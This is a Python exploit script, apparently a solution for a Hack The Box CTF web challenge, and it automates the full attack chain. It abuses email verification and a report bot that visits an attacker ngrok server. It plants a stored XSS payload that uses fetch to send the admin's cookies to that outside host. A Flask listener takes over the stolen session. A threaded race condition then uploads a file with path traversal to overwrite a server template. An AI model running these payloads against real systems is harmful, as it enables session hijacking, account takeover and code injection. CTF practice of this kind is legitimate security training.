import re
import requests
from time import sleep
import datetime
from flask import Flask, render_template, request
from flask_cors import CORS, cross_origin
import base64


import urllib3
urllib3.disable_warnings()

class Exploit:
    def __init__(self, ngrok, target):
        self.ngrok = ngrok
        self.target = target

    def registerNewUserAndLogin(self, email):
        data = {
            "email": email,
            "password": "1234"
        }

        session = requests.session()
        response = session.post(url=self.target + "/challenge/api/register", data=data, verify=False)
        response = session.post(url=self.target + "/challenge/api/login", data=data, verify=False)
        newtoken = response.headers['Set-Cookie'].split("session=")[1].split(';')[0]
        session.get(url = self.target + "/challenge/api/sendVerification", verify=False)
        return newtoken

    def addProduct(self):
        data = {
            "name": "A",
            "price": "A",
            "imageURL": "A",
            "seller": "A",
            "description": "A",
            "note": f"<span>Hello</span>`;fetch('{self.ngrok}/receive?data='+btoa(document.cookie));var i = `A",
            "antiCSRFToken": self.CSRFToken
        }

        response = requests.post(self.target + "/challenge/api/addItem", data=data, cookies={"session": self.token}, verify=False)


    def sendReport(self, id):
        url = self.target + "/challenge/api/report"

        data = {
            "id": id,
            "antiCSRFToken": self.CSRFToken
        }

        requests.post(url, data=data, cookies={"session": self.token}, verify=False)

    def checkEmailAndGetToken(self):
        response = requests.get(self.target + "/email/", verify=False)
        requests.get(self.target + "/email/deleteall", verify=False)
        return self.getConfirmToken(response.text)

    def getConfirmToken(self, text):
        regex = r'\/challenge\/verify\?token=(.*?)[\\\"&]'
        if m := re.search(regex, text, re.MULTILINE):
            return m.group(1)
        return None

    def confirmEmail(self, confirmToken):
        requests.get(self.target + "/challenge/verify", params={"token": confirmToken}, cookies={"session": self.token}, verify=False)

    def raceCondition(self, filename):
        data = {
            "name": "name",
            "antiCSRFToken": self.CSRFToken
        }

        while not self.stop:
            with open(filename, 'rb') as f:
                response = requests.post(url = self.target + '/challenge/api/addContract', cookies={"session": self.token}, files={"file": ('../templates/info.html', f)}, data=data, verify=False)
                if 'Contract Added' in response.text:
                    for _ in range(10):
                        response = requests.get(self.target, verify=False)
                        if 'HTB' in response.text:
                            m = re.search("(HTB{.*?})", response.text)
                            print(m.group(1))
                            self.stop = True
                        else:
                            print("Flag not found", response.status_code, len(response.text))

    def getCSRFToken(self, token):
        import jwt
        decoded = jwt.decode(token, options={"verify_signature": False})
        return decoded['antiCSRFToken']

    def startExploit(self):
        print('Start Exploit')
        print('Creating the user test@email.htb')
        self.token = self.registerNewUserAndLogin("test@email.htb")
        self.CSRFToken = self.getCSRFToken(self.token)

        confirmToken = self.checkEmailAndGetToken()
        if confirmToken:
            self.confirmEmail(confirmToken)

        self.upgradeToInternal()

    def upgradeToInternal(self):
        print('Using the test@email.htb to create test@apexsurvive.htb with internal priv')
        print('Send payload to start WebSocket server')
        self.sendReport("../external?url="+self.ngrok)
        print('Waiting deployments', datetime.datetime.now())
        sleep(30)
        print('Create new user test@apexuservive.htb and wait for websocket capture confirmation email')
        self.token = self.registerNewUserAndLogin("test@apexsurvive.htb")
        self.CSRFToken = self.getCSRFToken(self.token)
        print('session for the internal user', self.token)
    
    def upgradeToAdministrator(self):
        print('Try to upgrade to Administrator')
        print('Send XSS got capture session of the adm')
        start_id = 7
        self.addProduct()
        self.sendReport(start_id)

    def getFlag(self):
        import concurrent.futures

        threads = 15
        pdf = ['./file.pdf'] * 6 
        payload = ['./exploit.html'] * threads

        data = pdf + payload
        self.stop = False

        print('Start Race Condition')
        print('Thread to upload PDF', len(pdf))
        print('Thread to upload payload', len(payload))

        with concurrent.futures.ThreadPoolExecutor(max_workers=len(data)) as executor:
            futures = [executor.submit(self.raceCondition, filename) for filename in data]

            [future.result() for future in concurrent.futures.as_completed(futures)]

app = Flask(__name__)

ngrok = "https://{YOUR_NGROK}"
target = "https://{IP}:{PORT}"
exploit = Exploit(ngrok, target)

@app.route('/')
def index():
    print('WebSocket Initialized')
    return render_template('index.html')

isAdmin = False
@app.route('/receive')
def recevie():
    global isAdmin
    if not isAdmin:
        isAdmin = True
        data = request.args.get('data')
        plaintext = base64.b64decode(data).decode('utf-8')
        print('Session captured')
        exploit.token = plaintext.split("session=")[1].split(';')[0]
        exploit.CSRFToken = exploit.getCSRFToken(exploit.token)
        exploit.getFlag()
    return ''

isInternal = False
@app.route('/captureEmail')
def captureEmail():
    global isInternal
    if not isInternal:
        isInternal = True
        print('ConfirmEmail recevie')
        data = request.args.get('data')
        text = base64.b64decode(data).decode('utf-8')
        print('Data captured')
        if 'close' not in text:
            confirmToken = exploit.getConfirmToken(text)
            if confirmToken:
                exploit.confirmEmail(confirmToken)
                print('Email comfirmed')
            else:
                print('Something got wrong! Unable to confirm the internal account')
        exploit.upgradeToAdministrator()
    return ""

if __name__ == '__main__':
    from threading import Thread
    thread = Thread(target= exploit.startExploit)
    thread.start()

    app.run(port=8000)
    